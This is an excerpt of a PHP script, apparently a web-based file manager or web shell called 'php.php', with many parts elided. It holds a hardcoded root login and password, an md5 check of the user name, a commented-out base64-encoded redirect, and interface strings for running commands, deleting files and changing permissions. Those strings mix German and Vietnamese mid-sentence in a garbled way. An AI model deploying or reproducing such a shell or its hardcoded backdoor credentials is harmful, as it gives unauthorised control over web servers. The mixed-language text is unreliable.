...
if($user_name == 'root' && $user_password == '@@@@@@@@@@##########!!!!!!!!!!'){
...
if(!empty($_REQUEST['logout'])) {
    ...
    if($logout == 'logout'){
    	...
    	header('Location: '.$base_url.'php.php');
        return; 
    }
}
...
function ckecker(){
    ...
    //print_r($user);
	if(md5($user)!="63a9f0ea7bb98050796b649e85481845"){
		//header("Location:".base64_decode("aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj0xanJkRzRFckstVQ=="));
        $http               = (isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == "on")) ? "https://" : "http://";
        $base_url = $http.$_SERVER['HTTP_HOST'].str_replace(basename($_SERVER['SCRIPT_NAME']),"",$_SERVER['SCRIPT_NAME']);
        $_SESSION['user_name'] = NULL;
        $_SESSION['user_password'] = NULL;
...
'password' => 'Kennwort',
'add' => 'Thêm',
'add_basic_auth' => 'HTTP-Basic-Auth Thêm',
...
'really_delete' => 'Sollen folgende Dateien wirklich Xóa werden?',
'deleted' => "Folgende Dateien wurden Xóa:\n[%1]",
'not_deleted' => "Folgende Dateien konnten nicht Xóa werden:\n[%1]",
...
'executed' => "\"[%1]\" wurde erfolgreich:\n{%2}",
'not_executed' => "\"[%1]\" konnte nicht erfolgreich werden:\n{%2}",
...
'permission_for' => 'Rechte cho "[%1]":',
'permission_set' => 'Die Rechte cho "[%1]" wurden auf [%2] gesetzt.',
'permission_not_set' => 'Die Rechte cho "[%1]" konnten nicht auf [%2] gesetzt werden.',
...
function html_header () {
    ...
    <body>
    <div><a href="'.$base_url.'php.php?logout=logout">Logout</a></div>
    ';
